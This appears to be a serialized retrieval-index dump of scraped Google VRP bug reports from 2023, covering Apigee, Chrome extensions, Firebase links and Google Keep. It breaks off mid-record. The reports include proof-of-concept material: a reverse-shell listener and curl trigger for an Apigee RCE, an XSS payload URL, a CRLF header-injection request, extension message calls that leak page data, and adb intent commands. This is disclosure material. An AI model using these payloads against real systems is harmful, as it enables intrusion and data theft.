"{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in android - google play services\r\nGoogle VRP\r\ntriaged\r\n01:06 | Jun 23, 2023\r\nclosed\r\n05:00 | Jun 23, 2023\r\naccepted\r\n04:43 | Jun 30, 2023\r\nfixed\r\n02:07 | Feb 14, 2024\r\nreward decided\r\n$500\r\nSummary: Google Play Services give users a browser with a suspicious JavaScript bridge and without parental control.\r\nSteps to reproduce:\r\nGo to a Google app that uses Google Play Services and allows you to go into \"manage your account\"  (such as settings->google, maps->account icon, etc.).\r\nClick \"Manage your account.\"\r\nGo to security, then \"Password Manager\", then click on the settings icon.\r\nClick on \"Set up\" in the \"On-device encryption\" section.\r\nClick on \"Learn more about on-device encryption.\"\r\nClick on the hamburger icon, then \"Privacy Policy\", scroll down until the end, and click the link named \"Google\".\r\nLog out of the account (click on the account icon and click \"Sign out\". It will log you out temporarily.)\r\nNow you have a browser without any restrictions and with the suspicious Java bridge (called \"mm\").\r\nTo see the suspicious JavaScript bridge,\r\nSearch for a JavaScript console such as \"eruda\", go to it, and then activate it.\r\nType \"mm\", and expand the object.\r\n\"mm\" is the  suspicious JavaScript bridge, and every website you visit has access to it.\r\nBrowser/OS: Android (with a Google account)\r\nAttack scenario:\r\nFirst, it will get a private browser without parental control that will not show up in history on any Android without needing to install another browser.\r\nSecond, this is a security risk and not a proven vulnerability,  and this is the \"mm\" JavaScript bridge (called 'FolsomJsBridge' in the code):\r\n\"mm\" has three methods (all returns void):\r\n       addEncryptionRecoveryMethod(String str_without_use, Sting json_members_string, String bytes_as_json, int i )\r\n       setVaultSharedKeys(String str_without_use, String full_json_string)\r\nboth of this methods get json of {0:{0:number1},{1:number2},1:{0:number1},{1:number2}}.\r\n       closeView(): just close the webView. Not a security vulnerability by itself but can be useful in some cases. For example, if someone finds an intent that could start this browser with a given URL, this could be used to hide a malicious website after it does something with the previous functions.\r\nThis risk may have a lot of potential in these cases:\r\nIf  one of these functions writes to a user-controlled file, then it's a privilege escalation\r\nIf some intent could trigger this browser to go into a user-controlled website, then it's ransom - the attacker could set its own keys, and ask for money for the decryption.\r\nIf someone gives the attacker his phone open on a pinned app that uses GMS (such as Maps, some of the phone apps, Keep, etc. ), then the attacker could go into the web and use the full Google suite. For example, look at private photos, or send himself an email with the private information. Then it's a pinned-app bypass.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2986, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "63c6b2c6-2da6-445a-b570-6982a64650a3": {"__data__": {"id_": "63c6b2c6-2da6-445a-b570-6982a64650a3", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175651_978034.txt", "file_name": "20250408_175651_978034.txt", "file_type": "text/plain", "file_size": 1151, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "963596af-a032-4fbd-8503-515ddb4fc969", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175651_978034.txt", "file_name": "20250408_175651_978034.txt", "file_type": "text/plain", "file_size": 1151, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "cc50aa70bbaa5a5c14559bf58fb537acb6f69374bc9aade552d9ad9d1c1ce2c1", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nURLs leak in Web Vitals\r\nReported by:\r\nNDevTK\r\nGoogle VRP\r\ntriaged\r\n16:56 | Jun 19, 2023\r\naccepted\r\n21:11 | Jun 23, 2023\r\ntriaged\r\n15:30 | Jul 4, 2023\r\naccepted\r\n19:01 | Jul 4, 2023\r\nfixed\r\n11:04 | Aug 31, 2023\r\nSummary:\r\nURLs leak in Web Vitals\r\nProduct:\r\nWeb Vitals\r\nURL:\r\nhttps://chrome.google.com/webstore/detail/web-vitals/ahfhijdlegdabablpippeagghigmibma?hl=en\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nIn the context of the content script on an attacker controlled website.\r\nchrome.storage.local.get(null, results => {\r\nfor (let hash in results) {\r\n console.log(results[hash].location);\r\n}\r\n});\r\nAttack scenario\r\nA compromised renderer can leak visited URLs this maybe sensitive for example the url may contain an access_token\r\nGit repo:\r\nhttps://github.com/GoogleChrome/web-vitals-extension/tree/master\r\nWhile I may be wrong this does look to be a Google extension.\r\nhttps://github.com/GoogleChrome/web-vitals-extension/blob/master/CONTRIBUTING.md\r\nDone as part of Grant issue 286169438\r\nhttps://web.dev/debug-cwvs-with-web-vitals-extension/\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1135, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "1cf868ad-75a8-4aa6-9d4f-0844628cb925": {"__data__": {"id_": "1cf868ad-75a8-4aa6-9d4f-0844628cb925", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175652_011090.txt", "file_name": "20250408_175652_011090.txt", "file_type": "text/plain", "file_size": 3274, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c7dc7433-d0eb-48e8-acc7-fcec7e76c7b0", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175652_011090.txt", "file_name": "20250408_175652_011090.txt", "file_type": "text/plain", "file_size": 3274, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "eeb6bd66edfad33a27f13b3edf6df1f414d35b8893fca3e276949e73b97b9ba0", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nSandbox Bypass vulnerability in Google Apigee allows a remote attacker to bypass restrictions imposed by Rhino's ClassShutter and execute arbitrary Java code.\r\nGoogle VRP\r\ntriaged\r\n15:08 | Jun 12, 2023\r\naccepted\r\n20:30 | Jun 14, 2023\r\nfixed\r\n09:09 | Nov 14, 2023\r\nreward decided\r\n$1,337\r\nSummary:\r\nSandbox Bypass vulnerability in Google Apigee allows a remote attacker to bypass restrictions imposed by Rhino's ClassShutter and execute arbitrary Java code.\r\nProduct:\r\nApigee\r\nVulnerability type:\r\nRemote Code Execution (RCE)\r\nDetails\r\nHi Google Security Team,\r\nWith great pleasure I want to tell you about another possibility of bypassing the code execution restrictions in Apigee.\r\nAs you already know, it's possible to extend Apigee functionality by custom code - there are JavaScript, JavaCallout and PythonScript policies for this.\r\nJavaCallout and PythonScript policies are protected from malicious code by using Java Security Manager and Java Permissions - every time when user tries to run some code, Java Security Manager checks if there are any call of potentially harmful functions (e.g. binding listeners, accessing filesystem, etc) and prevents this\r\n(more info here)\r\n.\r\nAs for the JavaScript, Apigee has Rhino engine under the hood, which has their own mechanisms to prevent malicios code from running -\r\nClassShutter\r\n(check here)\r\nand forbidding access to\r\ngetClass\r\nmethod. Both mechanisms are implemented in Apigee.\r\nHowever, due to the fact that different policies use different security mechanisms but in the same time they can share same objects by using flow (MessageContext) variables, it's possible to circumvent sandbox logic by creating a special class with malicious code in JavaCallout, passing an object of the special class into JavaScript policy and execute malicious code.\r\nAttack scenario\r\nThe vulnerability can be exploited by a remote attacker.\r\nThe attacker can execute arbitrary Java code. The attacker can bind a reverse shell.\r\nSteps to reproduce\r\nSetup reverse shell listener on your publicly available server with the following command:\r\nnc -lvnp YOUR_PORT\r\n, where YOUR_PORT is a port on your server where you want to accept incoming reverse shell connection.\r\nDownload PoC proxy from the attachments (make-rce-great-again_rev5_2023_06_11.zip).\r\nCreate a proxy in the Apigee UI and upload PoC proxy into it.\r\nSave revision and deploy your proxy.\r\nUse the following command to trigger RCE in JavaScript policy in Apigee and bind a reverse shell, but first replace DOMAIN with Apigee instance domain name, YOUR_IP and YOUR_PORT with the values of your server, where you have reverse shell listener.\r\ncurl -X GET \\\r\n  'https://DOMAIN/make-rce-great-again' \\\r\n  --header 'ReverseShell-IP: YOUR_IP' \\\r\n  --header 'ReverseShell-Port: YOUR_PORT'\r\nObserve reverse shell connection!\r\nPoC explanation\r\nProxy contains only two policies - JavaCallout and JavaScript.\r\nIn JavaCallout I create an object with\r\nrun()\r\nmalicious method and put the object into\r\nrceObject\r\nflow variable. In JavaScript policy I obtain reverse shell IP and port as headers (for easier reproduce), get\r\nrceObject\r\nfrom flow and execute\r\nrun()\r\nmethod, which binds a reverse shell.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3258, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "4dc21662-3ae0-4006-9253-f0d7be64f107": {"__data__": {"id_": "4dc21662-3ae0-4006-9253-f0d7be64f107", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175652_047181.txt", "file_name": "20250408_175652_047181.txt", "file_type": "text/plain", "file_size": 1012, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "18c3ac27-a884-455b-a17a-8d974f54dd18", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175652_047181.txt", "file_name": "20250408_175652_047181.txt", "file_type": "text/plain", "file_size": 1012, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "c1ea257a4fc74723f1e4ec618b221b389ca96b987d014d394ec7c6a57d32eb3b", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nSOP bypass via AMP Readiness Tool\r\nReported by:\r\nNDevTK\r\nGoogle VRP\r\ntriaged\r\n15:13 | Jun 12, 2023\r\naccepted\r\n18:36 | Jun 15, 2023\r\nfixed\r\n04:30 | Apr 13, 2024\r\nSummary:\r\nSOP bypass via AMP Readiness Tool\r\nProduct:\r\nAMP Readiness Tool\r\nURL:\r\nhttps://chrome.google.com/webstore/detail/amp-readiness-tool/fadclbipdhchagpdkjfcpippejnekimg\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nIn the context of the content script on an attacker controlled site run:\r\nwindow.onclick = () => {\r\nopen('https://www.google.com');\r\nsetTimeout(() => {\r\nchrome.runtime.sendMessage({id: 'get_apps', tab: {id: ''}}, e => {console.log(e.html)})\r\n}, 3000);\r\n}\r\nClick on the page and the console should log the victims html.\r\nAttack scenario\r\nA compromised renderer can bypass the SOP via the AMP Readiness Tool\r\nExtension contact:\r\namp-readiness-tool-admin@google.com\r\nI'm aware this bug is boring.\r\nDone as part of Grant issue 286169438\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 996, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "e9818ef0-f2f0-435e-8266-07b351a89d99": {"__data__": {"id_": "e9818ef0-f2f0-435e-8266-07b351a89d99", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175652_094133.txt", "file_name": "20250408_175652_094133.txt", "file_type": "text/plain", "file_size": 918, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "6b7a3f2a-260e-494b-bba7-0b07c7921c4e", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175652_094133.txt", "file_name": "20250408_175652_094133.txt", "file_type": "text/plain", "file_size": 918, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "6935989d6be19cd76486d81e21b4dd2a88f7beedf28723b313cb515426d4c503", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nBug XSS\r\nGoogle VRP\r\ntriaged\r\n17:09 | Jun 8, 2023\r\naccepted\r\n17:12 | Jun 8, 2023\r\nfixed\r\n18:21 | Jun 18, 2023\r\nreward decided\r\n$100\r\nSummary:\r\nBug XSS\r\nProduct:\r\nGoogle\r\nURL:\r\nhttps://granularinsurance.com/\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nHi Google Team, have a good day.\r\nI've found an XSS bug in one of the service domains in scope for this program.\r\nAttack scenario\r\nIn this main domain I tested, I found the input parameter\r\n?s=\r\nwhich is very vulnerable to XSS attacks, anyone can do an attack on the input parameter\r\n?s=\r\n. I found this to be in scope for the bughunter program.\r\nAttackers can enter malicious code such as:\r\ntest\"><%0ascript>warning(document.domain)<%0a/script>\r\n.\r\nHere's a complete example:\r\nhttps://granularinsurance.com/?s=test\"><%0ascript>warning(document.domain)<%0a/script>\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 902, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "35859147-247b-47b0-adda-797f40787f81": {"__data__": {"id_": "35859147-247b-47b0-adda-797f40787f81", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_211238.txt", "file_name": "20250408_175654_211238.txt", "file_type": "text/plain", "file_size": 1258, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c302a78e-9a8e-4671-b8b4-6dd2d2ff21dc", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_211238.txt", "file_name": "20250408_175654_211238.txt", "file_type": "text/plain", "file_size": 1258, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "95499f4edf09417e2fe79c1568e0e895863583b8473023ca1007302c09548477", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nSOP bypass via Tag Assistant Legacy\r\nReported by:\r\nNDevTK\r\nGoogle VRP\r\ntriaged\r\n17:53 | Jun 8, 2023\r\naccepted\r\n18:11 | Jun 8, 2023\r\ntriaged\r\n20:23 | Jul 4, 2023\r\naccepted\r\n21:01 | Jul 4, 2023\r\ntriaged\r\n07:06 | Jul 15, 2023\r\naccepted\r\n06:06 | Aug 8, 2023\r\ntriaged\r\n15:07 | Aug 9, 2023\r\naccepted\r\n17:50 | Aug 14, 2023\r\nfixed\r\n07:50 | Sep 1, 2023\r\nreward decided\r\n$5,000\r\nSummary:\r\nSOP bypass via Tag Assistant Legacy\r\nProduct:\r\nGoogle Tag Assistant\r\nURL:\r\nhttps://chrome.google.com/webstore/detail/tag-assistant-legacy-by-g/kejbdjndbnbjgmefkgdddjlbokphdefk/\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nIn the context of the content script on an attacker controlled website:\r\nchrome.runtime.sendMessage({message: 'LoadScript', url: '\r\nhttps://www.google.com'}\r\n, console.log);\r\nAttack scenario\r\nA compromised renderer can bypass the same origin policy.\r\nI don't think this includes cookies however this may leak sensitive data from the user internal network.\r\nFor example chrome.runtime.sendMessage({message: 'LoadScript', url: '\r\nhttp://192.168.1.1'}\r\n, console.log); leaks the login page of my router which is not ideal.\r\nDone as part of Grant issue 286169438\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1242, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "6df7e07d-0137-4cca-8d2f-6e55e91948d7": {"__data__": {"id_": "6df7e07d-0137-4cca-8d2f-6e55e91948d7", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_243902.txt", "file_name": "20250408_175654_243902.txt", "file_type": "text/plain", "file_size": 2242, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c3d1ce14-6cb9-4818-89b6-904575e226cd", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_243902.txt", "file_name": "20250408_175654_243902.txt", "file_type": "text/plain", "file_size": 2242, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "dfcff88e279ef31704ecee98f99c2fbc5b84bc90f9fb91b99b1b98b57d67345d", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nChromium's intent:// restrictions bypassed via firebase dynamic links\r\nReported by:\r\nNDevTK\r\nGoogle VRP\r\ntriaged\r\n15:43 | Jun 7, 2023\r\naccepted\r\n15:49 | Jun 7, 2023\r\nfixed\r\n07:19 | Nov 6, 2023\r\nSummary:\r\nChromium's intent:// restrictions bypassed via firebase dynamic links\r\nProduct:\r\nFirebase\r\nURL:\r\nhttps://ndevtk.page.link/PZXe\r\nVulnerability type:\r\nExploit Mitigation Bypass\r\nDetails\r\nUse the following from Chrome on Android:\r\n<a href=\"https://ndevtk.page.link/PZXe\">Click me</a> make sure the Samsung browser is installed.\r\nFirebase dynamic links can open a potentially insecure non-default Samsung, Firefox, Chrome browser to an attacker controlled URL on Android. This app does not need to be owned by the attacker.\r\nAttached video shows bypassing of consent from the user. (There's meant to be a prompt)\r\nAttack scenario\r\nThis bypasses\r\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=1345630\r\n(prompt for opening other browsers) which got Security_Severity-High in a report from the Google Threat Analysis Group.\r\n\"FDLs should respect the user's browser choice when launching a browser\"\r\nSandbox escape:\r\nintent://null.app.goo.gl/vuln#Intent;package=com.google.android.gms;scheme=https;S.browser_fallback_url=\r\nhttps://websecblog.com/vulns/bypassing-firebase-authorization-to-create-custom-goo-gl-subdomains/;end\r\n;\r\nRedirect user to diffrent browser:\r\nintent://ndevtk.page.link/PZXe#Intent;package=com.google.android.gms;action=com.google.firebase.dynamiclinks.VIEW_DYNAMIC_LINK;scheme=https;S.browser_fallback_url=\r\nhttps://play.google.com/store/apps/details%3Fid%3Dcom.sec.android.app.sbrowser&pcampaignid%3Dfdl_short&url%3Dhttps://terjanq.me/xss.php%3Fheaders;end\r\n;\r\n\"The problem appears to be that GMS, through firebase dynamic links, is acting as an arbitrary redirection app and can be used to bypass our restrictions on which apps can be launched.\"\r\nThis was moved to Google VRP from the Chromium issue tracker\r\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=1445988\r\nplease cc [REDACTED_EMAIL] so they can provide additional context.\r\n..And\r\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=1365100\r\ngets bypassed :)\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2226, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "e865073e-ef16-4d89-b490-f055dabb8681": {"__data__": {"id_": "e865073e-ef16-4d89-b490-f055dabb8681", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_277048.txt", "file_name": "20250408_175654_277048.txt", "file_type": "text/plain", "file_size": 3156, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "0e41de41-abb0-4146-a3f7-3d568290221f", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_277048.txt", "file_name": "20250408_175654_277048.txt", "file_type": "text/plain", "file_size": 3156, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "cab7dac87851ab06f42817b6bc84ee6176483b0569714fbd87b4ff73877a017d", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nHeader Injection vulnerability in Google Apigee allows remote attacker to inject arbitrary headers or pollute request body when calling a target system under some circumstances\r\nGoogle VRP\r\ntriaged\r\n15:56 | Jun 5, 2023\r\naccepted\r\n21:12 | Jun 14, 2023\r\nfixed\r\n00:14 | Nov 14, 2023\r\nreward decided\r\n$1,337\r\nSummary:\r\nHeader Injection vulnerability in Google Apigee allows remote attacker to inject arbitrary headers or pollute request body when calling a target system under some circumstances\r\nProduct:\r\nApigee\r\nVulnerability type:\r\nOther\r\nDetails\r\nHi Google Security team,\r\nThere are few ways in Apigee to add/set custom headers.\r\n1) By using\r\nAssignMessage\r\npolicy\r\nCase 1 - Add header via AssignMessage policy\r\n<AssignMessage name=\"AM-add-headers-1\">\r\n  <Add>\r\n    <Headers>\r\n      <Header name=\"partner-id\">{verifyapikey.VAK-1.developer.app.partner-id}</Header>\r\n    </Headers>\r\n  </Add>\r\n  <AssignTo>request</AssignTo>\r\n</AssignMessage>\r\nCase 2 - Set header via AssignMessage policy\r\n<AssignMessage name=\"AM-Set-Header\">\r\n  <Set>\r\n    <Headers>\r\n        <Header name=\"authenticated-developer\">{verifyapikey.VAK-1.developer.id}</Header>\r\n    </Headers>\r\n  </Set>\r\n  <AssignTo>request</AssignTo>\r\n</AssignMessage>\r\n2) By manipulating\r\n[request|response|message].header.*\r\nflow variables\r\nCase 3 - Add header by manipulating flow variable via JavaScript policy\r\ncontext.setVariable(\"request.header.customHeader\", variable);\r\nCase 4 - Set header by position by manipulating flow variable via JavaScript policy\r\ncontext.setVariable(\"request.header.customHeader.1\", variable);\r\nIn the cases 1, 2 and 3 Apigee sanitizes headers values by removing all newline (\\n) characters.\r\nHowever, this does not happen in case 4, which allows malicious user to inject new header or body in request to target/callout system.\r\nAttack scenario\r\nThe vulnerability can be exploited by a remote attacker.\r\nThe attacker can circumvent business logic.\r\nThe attacker can add unexpected headers in request to target/callout system.\r\nThe attacker can override body of the request to target/callout system.\r\nAn Apigee proxy must use user input as header value (e.g. by moving it from body or query to headers)\r\nPlease find a PoC proxy (header-injection_rev2_2023_06_03.zip ) attached.\r\nSteps to reproduce:\r\nDownload PoC proxy from the attachments.\r\nCreate new proxy in Apigee UI by importing PoC proxy.\r\nReplace\r\n<APIGEE_HOST>\r\nin the following cURL snippet with ip/domain of your Apigee instance and send it.\r\ncurl -X POST \\\r\n  'https://<APIGEE_HOST>/header-injection' \\\r\n  --header 'Host: <APIGEE_HOST>' \\\r\n  --header 'Content-Type: application/x-www-form-urlencoded' \\\r\n  --data-raw 'variable=Value%0D%0AInjectedHeader%3A%20InjectedValue'\r\nObserve, that\r\nhttpbin\r\nresponded with Injectedheader: InjectedValue in headers section.\r\nP.S. If you are more comfortable with Burp Collaborator, you can use collaborator URL as target system to get raw request. Just go to Develop tab in Proxy editor, click on\r\ndefault\r\ntarget endpoint and replace the value of\r\n<URL>\r\ntag with your collaborator URL.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3140, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "14007516-4e91-4e5b-bfdc-b2b306f25ce7": {"__data__": {"id_": "14007516-4e91-4e5b-bfdc-b2b306f25ce7", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_307170.txt", "file_name": "20250408_175654_307170.txt", "file_type": "text/plain", "file_size": 2312, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "1d5666f6-2915-4572-9244-6b6ecd146d15", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_307170.txt", "file_name": "20250408_175654_307170.txt", "file_type": "text/plain", "file_size": 2312, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "cffb952033bbecb9877958840f547097f4fd345c2864c5679ab02e69eaca4357", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nBug allows third-party apps to create and delete notes in Google Keep\r\nReported by:\r\nJatin\r\nGoogle VRP\r\ntriaged\r\n22:43 | May 24, 2023\r\naccepted\r\n04:39 | May 27, 2023\r\nfixed\r\n01:31 | Aug 31, 2023\r\nreward decided\r\n$1,875\r\nSummary:\r\nBug allows third-party apps to create and delete notes in Google Keep\r\nProduct:\r\nGoogle Keep\r\nURL:\r\nhttps://play.google.com/store/apps/details?id=com.google.android.keep\r\nVulnerability type:\r\nOther\r\nDetails\r\nBug Details\r\nThe\r\nandroid:exported\r\nflag of\r\nVoiceActionActivity\r\npresent in Google Keep is set to\r\nTrue\r\n. \r\nAs the result any third party app can launch it to do the malicious stuff. It provides direct access to the following functionalities to any third-party app without user's interaction :\r\nCreate new notes.\r\nDelete notes.\r\nUpdate notes.\r\nVulnerable Activity:\r\ncom.google.android.keep.activities.VoiceActionActivity\r\nReproudction\r\nIn order to reproduce the bug, we need  following things :-\r\nAndroid device, with latest Google Keep installed.\r\nADB installed on PC\r\nNote Creation\r\nConnect your device with PC, make sure the USB debugging is enabled.\r\nCopy-Paste the below shell command in terminal\r\nadb shell am start-activity -a com.google.android.gms.actions.CREATE_NOTE --es android.intent.extra.TEXT testing com.google.android.keep/.activities.VoiceActionActivity\r\nYou will see an activity got popped up with the content\r\ntesting\r\n. At this time the note is created and saved.\r\nNote Deletion\r\nIn order to delete a note we need\r\nnoteUuid\r\n, it is a random value, that gets generated while note creation. But if we somehow got to know the uuid,  then the below command can be used to delete the\r\nnote\r\nwithout user's interaction or notifying it.\r\nadb shell am start-activity -a -a com.google.android.gms.actions.DELETE_NOTE --es --es noteUuid <noteUuidHere> com.google.android.keep/.activities.VoiceActionActivity\r\nIn order to verify, I captured the uuid from web app of Google Keep, and used above command to see if it delete. The result was positive.\r\nPoC File\r\nI am attaching a bash file for the reference\r\nAttack scenario\r\nThe threat here is that the bug allows access to certain\r\nauthorized  functionalities\r\nthat leads to\r\ntampering\r\nof user's data present in Google Keep.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2296, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "14d104f9-ea53-404a-b164-7c4b38083ddb": {"__data__": {"id_": "14d104f9-ea53-404a-b164-7c4b38083ddb", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_354319.txt", "file_name": "20250408_175654_354319.txt", "file_type": "text/plain", "file_size": 1562, "creation_date": 